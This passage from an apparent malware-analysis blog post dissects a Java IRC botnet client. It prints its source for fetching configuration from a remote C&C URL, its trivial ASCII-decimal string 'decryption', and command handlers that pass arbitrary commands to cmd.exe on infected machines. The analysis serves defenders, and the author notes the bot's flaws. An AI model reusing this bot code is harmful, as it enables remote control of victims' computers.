+<span class="n">IRC</span><span class="o">.</span><span class="na">join</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getInputChannel</span><span class="o">(),</span> <span class="n">Config</span><span class="o">.</span><span class="na">getInputChannelPassword</span><span class="o">());</span>
+
+<span class="n">IRC</span><span class="o">.</span><span class="na">join</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getOutputChannel</span><span class="o">(),</span> <span class="n">Config</span><span class="o">.</span><span class="na">getOutputChannelPassword</span><span class="o">());</span>
+
+
+
+<span class="n">ircProcess</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+<span class="n">setIsConnected</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+
+<span class="n">Misc</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="s">&quot;Connection to &quot;</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getConnect</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;:&quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getPort</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot; was sucsessful!&quot;</span><span class="o">).</span><span class="na"><font color="red">toString</font></span><span class="o">());</span>
+
+
+
+<span class="n">Misc</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="s">&quot;<font color="red">User</font> settings: Nick: &quot;</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getNick</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot; | <font color="red">Channel</font>: &quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">()).</span><span class="na"><font color="red">toString</font></span><span class="o">());</span>
+
+
+
+<span class="n">init</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+<span class="n">ProcessChecker</span> <span class="n">proc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessChecker</span><span class="o">();</span>
+
+
+
+<span class="n">proc</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+
+
+</pre>
+</div>
+</div>
+<p>The very first <font color="red">function</font> in main is from the ConfigReader class, specifically the read <font color="red">function</font>. This <font color="red">function</font> downloads a <font color="red">configuration file</font> for the <font color="red">botnet</font> client. The URL is stored in the file upon initial &#8220;distribution&#8221;. The <font color="red">function</font> first validates the URL stored in the binary and then attempts to download a <font color="red">configuration file</font>. Once validated, the readURL <font color="red">function</font> parses the <font color="red">configuration file</font>. Using the <font color="red">functions</font> from the ConfigDefaults class, the command-and-control <font color="red">server</font>, port, <font color="red">channels</font> and <font color="red">passwords</font> are all set. Note I said <font color="red">channels</font>; this <font color="red">bot</font> has the ability to accept commands from one <font color="red">channel</font> and then output their result on another. All of this sets up the C&amp;C infrastructure on the client.</p>
+<div class="scrollable">
+<div class="highlight">
+<pre><span class="k"></span> <span class="nn"></span><span class="o"></span>
+
+
+
+<span class="k">public</span> <span class="k">class</span> <span class="nc">ConfigReader</span> 
+
+<span class="o">{</span>
+
+	<span class="c">/**</span>
+
+<span class="c">	 * Reads <font color="red">config</font></span>
+
+<span class="c">	 */</span>
+
+	<span class="k">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">read</span><span class="o">()</span> 
+
+	<span class="o">{</span>
+
+		<span class="k">try</span> 
+
+		<span class="o">{</span>
+
+			<span class="n">URL</span> <span class="n">confURL</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+
+			<span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">&quot;unused&quot;</span><span class="o">)</span>
+
+			<span class="n">URLChecker</span> <span class="n">checker</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLChecker</span><span class="o">(</span><span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">Constants</span><span class="o">.</span><span class="na">CONF_URL</span><span class="o">));</span>
+
+
+
+			<span class="k">if</span><span class="o">(</span><span class="n">URLChecker</span><span class="o">.</span><span class="na">check</span><span class="o">())</span> 
+
+			<span class="o">{</span>
+
+				<span class="n">confURL</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">Constants</span><span class="o">.</span><span class="na">CONF_URL</span><span class="o">);</span>
+
+			<span class="o">}</span> 
+
+			<span class="k">else</span> 
+
+			<span class="o">{</span>
+
+				<span class="n">checker</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLChecker</span><span class="o">(</span><span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">Constants</span><span class="o">.</span><span class="na">CONF_URL_BACKUP</span><span class="o">));</span>
+
+
+
+				<span class="k">if</span><span class="o">(</span><span class="n">URLChecker</span><span class="o">.</span><span class="na">check</span><span class="o">())</span> 
+
+				<span class="o">{</span>
+
+					<span class="n">confURL</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">Constants</span><span class="o">.</span><span class="na">CONF_URL_BACKUP</span><span class="o">);</span>
+
+
+
+				<span class="o">}</span>
+
+			<span class="o">}</span>
+
+
+
+			<span class="k">if</span><span class="o">(</span><span class="n">confURL</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> 
+
+			<span class="o">{</span>
+
+				<span class="n">Misc</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">&quot;Reading from &quot;</span> <span class="o">+</span> <span class="n">Constants</span><span class="o">.</span><span class="na">CONF_URL</span> <span class="o">+</span> <span class="s">&quot;... \n&quot;</span><span class="o">);</span>
+
+				<span class="n">ConfigReader</span><span class="o">.</span><span class="na">readURL</span><span class="o">();</span>
+
+			<span class="o">}</span>
+
+		<span class="o">}</span> 
+
+		<span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> 
+
+		<span class="o">{</span>
+
+
+
+			
+
+		<span class="o">}</span>
+
+	<span class="o">}</span>
+
+	<span class="c">/**</span>
+
+<span class="c">	 * Reads <font color="red">config</font></span>
+
+<span class="c">	 */</span>
+
+	<span class="k">static</span> <span class="kt">void</span> <span class="nf">readURL</span><span class="o">()</span> 
+
+	<span class="o">{</span>
+
+		<span class="k">try</span> 
+
+		<span class="o">{</span>
+
+			<span class="n">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">Constants</span><span class="o">.</span><span class="na">CONF_URL</span><span class="o">);</span>
+
+
+
+			<span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">url</span><span class="o">.</span><span class="na">openStream</span><span class="o">()));</span>
+
+
+
+			<span class="n">String</span> <span class="n">line</span><span class="o">;</span>
+
+			<span class="k">while</span><span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+
+
+
+				<span class="n">String</span><span class="o">[]</span> <span class="n">tokens</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">&quot;&lt;/br&gt;&quot;</span><span class="o">);</span>
+
+				<span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">setCONNECT</span><span class="o">(</span><span class="n">tokens</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na"><font color="red">substring</font></span><span class="o">(</span><span class="mi">8</span><span class="o">));</span>
+
+
+
+				<span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">setPORT</span><span class="o">(</span><span class="n">tokens</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="na"><font color="red">substring</font></span><span class="o">(</span><span class="mi">6</span><span class="o">));</span>
+
+				<span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">setINPUT_<font color="red">CHANNEL</font></span><span class="o">(</span><span class="n">tokens</span><span class="o">[</span><span class="mi">2</span><span class="o">].</span><span class="na"><font color="red">substring</font></span><span class="o">(</span><span class="mi">12</span><span class="o">));</span>
+
+
+
+				<span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">setOUTPUT_<font color="red">CHANNEL</font></span><span class="o">(</span><span class="n">tokens</span><span class="o">[</span><span class="mi">3</span><span class="o">].</span><span class="na"><font color="red">substring</font></span><span class="o">(</span><span class="mi">13</span><span class="o">));</span>
+
+				<span class="n">Misc</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="n">tokens</span><span class="o">[</span><span class="mi">3</span><span class="o">].</span><span class="na"><font color="red">substring</font></span><span class="o">(</span><span class="mi">13</span><span class="o">));</span>
+
+
+
+				<span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">setINPUT_CHANNEL_PASSWORD</span><span class="o">(</span><span class="n">tokens</span><span class="o">[</span><span class="mi">4</span><span class="o">].</span><span class="na"><font color="red">substring</font></span><span class="o">(</span><span class="mi">13</span><span class="o">));</span>
+
+				<span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">setOUTPUT_CHANNEL_PASSWORD</span><span class="o">(</span><span class="n">tokens</span><span class="o">[</span><span class="mi">5</span><span class="o">].</span><span class="na"><font color="red">substring</font></span><span class="o">(</span><span class="mi">13</span><span class="o">));</span>
+
+
+
+				<span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">setPREFIX</span><span class="o">(</span><span class="n">tokens</span><span class="o">[</span><span class="mi">6</span><span class="o">].</span><span class="na"><font color="red">substring</font></span><span class="o">(</span><span class="mi">6</span><span class="o">));</span>
+
+				<span class="n">String</span><span class="o">[]</span> <span class="n"><font color="red">controllers</font></span> <span class="o">=</span> <span class="n">tokens</span><span class="o">[</span><span class="mi">7</span><span class="o">].</span><span class="na"><font color="red">substring</font></span><span class="o">(</span><span class="mi">13</span><span class="o">).</span><span class="na">split</span><span class="o">(</span><span class="s">&quot;,&quot;</span><span class="o">);</span>
+
+
+
+				<span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">setControllers</span><span class="o">(</span><span class="n"><font color="red">controllers</font></span><span class="o">);</span>
+
+				<span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">setCHANNEL</span><span class="o">(</span><span class="n">tokens</span><span class="o">[</span><span class="mi">8</span><span class="o">].</span><span class="na"><font color="red">substring</font></span><span class="o">(</span><span class="mi">9</span><span class="o">));</span>
+
+
+
+			<span class="o">}</span>
+
+		<span class="o">}</span>
+
+		<span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> 
+
+		<span class="o">{</span>
+
+			<span class="n">Misc</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">toString</span><span class="o">()</span> <span class="o">+</span> <span class="s">&quot;\n&quot;</span><span class="o">);</span>
+
+
+
+		<span class="o">}</span>
+
+	<span class="o">}</span>
+
+<span class="o">}</span>
+
+</pre>
+</div>
+</div>
+<p>I decided to dive into the <font color="red">config</font> class to see if the <font color="red">bot</font> contained any fancy obfuscation or <font color="red">encryption</font> code. I was delighted to see what appeared to be an <font color="red">encryption</font> layer! Note all the calls to a decrypt <font color="red">function</font>!</p>
+<div class="scrollable">
+<div class="highlight">
+<pre><span class="k"></span> <span class="nn"></span><span class="o"></span>
+
+<span class="c">/**</span>
+
+<span class="c"> * Returns the decrypted <font color="red">irc</font> <font color="red">server</font></span>
+
+<span class="c"> * @return</span>
+
+<span class="c"> */</span>
+
+<span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">getConnect</span><span class="o">()</span>
+
+<span class="o">{</span>
+
+    <span class="k">if</span><span class="o">(</span><span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">CONNECT</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">&quot; &quot;</span><span class="o">))</span>
+
+	<span class="k">return</span> <span class="n">Misc</span><span class="o">.</span><span class="na">decrypt</span><span class="o">(</span><span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">CONNECT</span><span class="o">);</span>
+
+    <span class="k">else</span>
+
+	<span class="k">return</span> <span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">CONNECT</span><span class="o">;</span>
+
+<span class="o">}</span>
+
+
+
+<span class="c">/**</span>
+
+<span class="c"> * Returns the decrypted port</span>
+
+<span class="c"> * @return</span>
+
+<span class="c"> */</span>
+
+<span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">getPort</span><span class="o">()</span>
+
+<span class="o">{</span>
+
+    <span class="k">if</span><span class="o">(</span><span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">PORT</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">&quot; &quot;</span><span class="o">))</span>
+
+	<span class="k">return</span> <span class="n">Misc</span><span class="o">.</span><span class="na">decrypt</span><span class="o">(</span><span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">PORT</span><span class="o">);</span>
+
+    <span class="k">else</span>
+
+	<span class="k">return</span> <span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">PORT</span><span class="o">;</span>
+
+<span class="o">}</span>
+
+
+
+<span class="c">/**</span>
+
+<span class="c"> * Returns the decrypted <font color="red">channel</font> for <font color="red">bots</font> to join</span>
+
+<span class="c"> * @return</span>
+
+<span class="c"> */</span>
+
+<span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">getChannel</span><span class="o">()</span>
+
+<span class="o">{</span>
+
+    <span class="k">if</span><span class="o">(</span><span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">CHANNEL</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">&quot; &quot;</span><span class="o">))</span>
+
+	<span class="k">return</span> <span class="n">Misc</span><span class="o">.</span><span class="na">decrypt</span><span class="o">(</span><span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">CHANNEL</span><span class="o">);</span>
+
+    <span class="k">else</span>
+
+	<span class="k">return</span> <span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">CHANNEL</span><span class="o">;</span>
+
+<span class="o">}</span>
+
+
+
+<span class="c">/**</span>
+
+<span class="c"> * Returns the decrypted input <font color="red">channel</font></span>
+
+<span class="c"> * @return</span>
+
+<span class="c"> */</span>
+
+<span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">getInputChannel</span><span class="o">()</span>
+
+<span class="o">{</span>
+
+    <span class="k">if</span><span class="o">(</span><span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">INPUT_<font color="red">CHANNEL</font></span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">&quot; &quot;</span><span class="o">))</span>
+
+	<span class="k">return</span> <span class="n">Misc</span><span class="o">.</span><span class="na">decrypt</span><span class="o">(</span><span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">INPUT_<font color="red">CHANNEL</font></span><span class="o">);</span>
+
+    <span class="k">else</span>
+
+	<span class="k">return</span> <span class="n">ConfigDeafaults</span><span class="o">.</span><span class="na">INPUT_CHANNEL</span><span class="o">;</span>
+
+<span class="o">}</span>
+
+</pre>
+</div>
+</div>
+<p>I dig a bit further to see what is actually going on&#8230;</p>
+<div class="scrollable">
+<div class="highlight">
+<pre><span class="k"></span> <span class="nn"></span><span class="o"></span>
+
+<span class="c">   /**</span>
+
+<span class="c">     * Decrypts the strings</span>
+
+<span class="c">     * @param s</span>
+
+<span class="c">     * @return</span>
+
+<span class="c">     */</span>
+
+    <span class="k">public</span> <span class="k">static</span> <span class="k">final</span> <span class="n">String</span> <span class="nf">decrypt</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
+
+    <span class="o">{</span>
+
+        <span class="n">String</span> <span class="n">as</span><span class="o">[]</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">&quot; &quot;</span><span class="o">);</span>
+
+
+
+        <span class="n">StringBuilder</span> <span class="n">stringbuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+
+        <span class="n">String</span> <span class="n">as1</span><span class="o">[]</span> <span class="o">=</span> <span class="n">as</span><span class="o">;</span>
+
+
+
+        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">as1</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
+
+        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">i</span><span class="o">;</span> <span class="n">j</span><span class="o">++)</span>
+
+        <span class="o">{</span>
+
+            <span class="n">String</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">as1</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
+
+            <span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">s1</span><span class="o">);</span>
+
+
+
+            <span class="n">stringbuilder</span><span class="o">.</span><span class="na">append</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span><span class="n">k</span><span class="o">);</span>
+
+        <span class="o">}</span>
+
+        <span class="k">return</span> <span class="n">stringbuilder</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+
+    <span class="o">}</span>
+
+</pre>
+</div>
+</div>
+<p>The author is basically taking a string and splitting it in a string array as[] at every space. He creates a StringBuilder object stringbuild to store the &#8220;decoded&#8221; new string in. After that he creates a copy of as[] called as1[]. The for loop iterates up to the length of as1 &#8212; so basically each group of signed <font color="red">integers</font> as they are broken by spaces. For each iteration of the loop he creates a new local string object s1 consisting of a particular group of <font color="red">integers</font> from array as1[] as designated by the loop invariant j. He then converts this signed decimal <font color="red">integer</font> using the parseInt <font color="red">function</font> and then typecast it as a char before converting it into a string. Basically this decodes everything from a decimal-based ascii encoding.</p>
+<p>To be honest I was a little disappointed it was so simple. In his defense though, perhaps it is intended that <font color="red">botmasters</font> insert their own substitution cipher.  But that said, it&#8217;s still pretty disappointing. Here is the key to his &#8220;cypher.&#8221;  It is actually included in the source, and man ascii would also turn it up 😛</p>
+<div class="scrollable">
+<div class="highlight">
+<pre>/ - 47
+
+0 - 48
+
+1 - 49
+
+2 - 50
+
+3 - 51
+
+4 - 52
+
+5 - 53
+
+6 - 54
+
+7 - 55
+
+8 - 56
+
+9 - 57
+
+: - 58
+
+; - 59
+
+&lt; - 60
+
+= - 61
+
+&gt; - 62
+
+? - 63
+
+@ - 64
+
+A - 65
+
+B - 66
+
+C - 67
+
+D - 68
+
+E - 69
+
+F - 70
+
+G - 71
+
+H - 72
+
+I - 73
+
+J - 74
+
+K - 75
+
+L - 76
+
+M - 77
+
+N - 78
+
+O - 79
+
+P - 80
+
+Q - 81
+
+R - 82
+
+S - 83
+
+T - 84
+
+U - 85
+
+V - 86
+
+W - 87
+
+X - 88
+
+Y - 89
+
+Z - 90
+
+[ - 91
+
+\ - 92
+
+] - 93
+
+^ - 94
+
+_ - 95
+
+` - 96
+
+a - 97
+
+b - 98
+
+c - 99
+
+d - 100
+
+e - 101
+
+f - 102
+
+g - 103
+
+h - 104
+
+i - 105
+
+j - 106
+
+k - 107
+
+l - 108
+
+m - 109
+
+n - 110
+
+o - 111
+
+p - 112
+
+q - 113
+
+r - 114
+
+s - 115
+
+t - 116
+
+u - 117
+
+v - 118
+
+w - 119
+
+x - 120
+
+y - 121
+
+z - 122
+
+</pre>
+</div>
+</div>
+<p>A coworker of mine, Naina Ananthaswamy, spotted the potential for a NumberFormatException. This will occur if s1 is not a string of parsable <font color="red">integers</font>. Say, for example, a <font color="red">botmaster</font> uploads his <font color="red">configuration file</font> and then the file is discovered. When the <font color="red">configuration file</font> is deleted, the web <font color="red">server</font> will send the <font color="red">bot</font> a 404 (not found) error. This will very likely trigger a number format exception and crash the <font color="red">bot</font>. Bugs like this are all too common in <font color="red">malware</font>, especially for <font color="red">bots</font> of this caliber&#8230;</p>
+<p>There is a CommandProcess class that checks to see if the command issued is valid and if it is to be executed depending on the status of the <font color="red">bot</font>. In order for something to be a valid command it must be prefixed with &#8220;$&#8221;. This little step is just to help prevent others from taking control of the <font color="red">bot</font>. In edition to containing the valid flag, a <font color="red">user</font> must enter the correct <font color="red">password</font> to unlock the features of the <font color="red">bot</font>. Special character command prefixes like $ or ! are extremely common in <font color="red">IRC</font> <font color="red">bots</font>.</p>
+<p>Now that I understood the basic structure of the <font color="red">bot</font> I decided to look into the various features and capabilities it supported in the CommandProcess class. The command execute is a very simple <font color="red">function</font> but it does allow the <font color="red">bot</font> master a very important capability.</p>
+<div class="scrollable">
+<div class="highlight">
+<pre><span class="k"></span> <span class="nn"></span><span class="o"></span>
+
+<span class="c">/**</span>
+
+<span class="c"> * Used to execute commands on the remote machine, acts as a remote <font color="red">CMD</font>.</span>
+
+<span class="c"> * @param <font color="red">cmd</font></span>
+
+<span class="c"> */</span>
+
+<span class="k">public</span> <span class="nf">CommandExecute</span><span class="o">(</span><span class="n">String</span> <span class="n"><font color="red">cmd</font></span><span class="o">)</span>
+
+<span class="o">{</span>
+
+    <span class="n">rt</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
+
+    <span class="n">command</span> <span class="o">=</span> <span class="n"><font color="red">cmd</font></span><span class="o">;</span>
+
+
+
+    <span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="s">&quot;Trying to execute command &quot;</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na"><font color="red">toString</font></span><span class="o">());</span>
+
+<span class="o">}</span>
+
+    
+
+<span class="c">/**</span>
+
+<span class="c"> * Runs the specified command on a new thread so other threads arn&#039;t interrupted.</span>
+
+<span class="c"> */</span>
+
+<span class="k">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span>
+
+<span class="o">{</span>
+
+    <span class="k">try</span>
+
+    <span class="o">{</span>
+
+	<span class="n">rt</span><span class="o">.</span><span class="na">exec</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="s">&quot;cmd.exe /C &quot;</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na"><font color="red">toString</font></span><span class="o">());</span>
+
+    <span class="o">}</span>
+
+    <span class="k">catch</span><span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span>
+
+    <span class="o">{</span>
+
+	<span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+
+    <span class="o">}</span>
+
+    <span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="s">&quot;Command executed: &quot;</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na"><font color="red">toString</font></span><span class="o">());</span>
+
+<span class="o">}</span>
+
+
+
+<span class="k">public</span> <span class="n">String</span> <span class="n">command</span><span class="o">;</span>
+
+<span class="n">Runtime</span> <span class="n">rt</span><span class="o">;</span>
+
+</pre>
+</div>
+</div>
+<p>Basically this <font color="red">function</font> allows the <font color="red">botmaster</font> to run any program already stored on the victim&#8217;s PC. This allows his thread to interact directly with the command-and-control <font color="red">channel</font> reporting the pre and post status of the command executed. Once the <font color="red">botmaster</font> has authenticated to the <font color="red">bot</font> he can run any program out of a <font color="red">user</font>&#8217;s <font color="red">home directory</font> using $execute <em>string</em>, where string is the command to be executed. The $shellcommand command is very similar, only the executable is not launched from the &#8220;<font color="red">user</font>&#8221; (victim&#8217;s) <font color="red">home directory</font>.  The commandlist <font color="red">function</font> would allow the master to basically query the <font color="red">bot</font> for a list of supported commands and the <font color="red">bot</font>&#8217;s current status &#8212; including current <font color="red">IP</font> addresses and the Windows username.
+</p>
+<div class="scrollable">
+<div class="highlight">
+<pre>
+
+<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$execute&quot;</span><span class="o">))</span>
+
+<span class="o">{</span>
+
+	<span class="n">String</span> <span class="n">execute</span><span class="o">;</span>
+
+	<span class="n">FileExecute</span> <span class="n">exeC</span><span class="o">;</span>
+
+	<span class="k">if</span> <span class="o">(</span><span class="n">directCmdTo</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">directCmdTo</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getNick</span><span class="o">()))</span>
+
+	<span class="o">{</span>
+
+		<span class="n">execute</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">9</span><span class="o">);</span>
+
+		<span class="n">execute</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;$getUserHome&quot;</span><span class="o">,</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&quot;user.home&quot;</span><span class="o">));</span>
+
+
+
+		<span class="n">exeC</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileExecute</span><span class="o">(</span><span class="n">execute</span><span class="o">);</span>
+
+		<span class="n">exeC</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+
+
+		<span class="k">return</span><span class="o">;</span>
+
+	<span class="o">}</span>
+
+	<span class="k">if</span> <span class="o">(</span><span class="n">directCmdTo</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
+
+	<span class="o">{</span>
+
+		<span class="n">execute</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">9</span><span class="o">);</span>
+
+		<span class="n">execute</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;$getUserHome&quot;</span><span class="o">,</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&quot;user.home&quot;</span><span class="o">));</span>
+
+
+
+		<span class="n">exeC</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileExecute</span><span class="o">(</span><span class="n">execute</span><span class="o">);</span>
+
+		<span class="n">exeC</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+	<span class="o">}</span>
+
+<span class="o">}</span>
+
+<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$shellcommand&quot;</span><span class="o">))</span>
+
+<span class="o">{</span>
+
+	<span class="n">String</span> <span class="n">command</span><span class="o">;</span>
+
+	<span class="n">CommandExecute</span> <span class="n">cmdE</span><span class="o">;</span>
+
+	<span class="k">if</span> <span class="o">(</span><span class="n">directCmdTo</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">directCmdTo</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getNick</span><span class="o">()))</span>
+
+	<span class="o">{</span>
+
+		<span class="n">command</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">14</span><span class="o">);</span>
+
+		<span class="n">cmdE</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CommandExecute</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
+
+
+
+		<span class="n">cmdE</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+		<span class="k">return</span><span class="o">;</span>
+
+	<span class="o">}</span>
+
+	<span class="k">if</span> <span class="o">(</span><span class="n">directCmdTo</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
+
+	<span class="o">{</span>
+
+		<span class="n">command</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">14</span><span class="o">);</span>
+
+		<span class="n">cmdE</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CommandExecute</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
+
+
+
+		<span class="n">cmdE</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+	<span class="o">}</span>
+
+<span class="o">}</span>
+
+</pre>
+</div>
+</div>
+<p>The <font color="red">bot</font> has quite a few other commands.  Here is an abbreviated list. Their <font color="red">functions</font> should be apparent.</p>
+<div class="scrollable">
+<div class="highlight">
+<pre>	
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$unlock&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$lock&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="s">&quot;$getip&quot;</span><span class="o">))</span>
+
+
